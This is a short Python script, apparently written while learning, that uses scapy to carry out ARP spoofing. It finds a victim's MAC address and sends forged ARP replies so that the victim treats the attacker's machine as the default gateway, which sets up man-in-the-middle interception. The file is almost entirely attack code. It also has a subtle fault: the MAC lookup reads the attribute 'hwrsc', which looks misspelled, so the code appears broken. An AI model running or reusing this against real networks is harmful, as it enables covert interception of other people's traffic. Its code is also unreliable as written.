import scapy.all as scapy

"""
op = set to the ARP response, 1 = request
pdst = victim IP addr
hwdst = victim MAC
psrc = set the packet source IP to gateway IP addr
"""


def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    # print(arp_request.summary())
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # print(broadcast.summary())
    arp_broadcast = broadcast/arp_request
    # arp_broadcast.show()
    ans_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    return ans_list[0][1].hwrsc


def spoof(target_ip, spoof_ip,):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)  # command change the default gateway IP to attacker MAC addr


"""
print(packet.show())
print(packet.summary())
summarize the packet generate above
"""
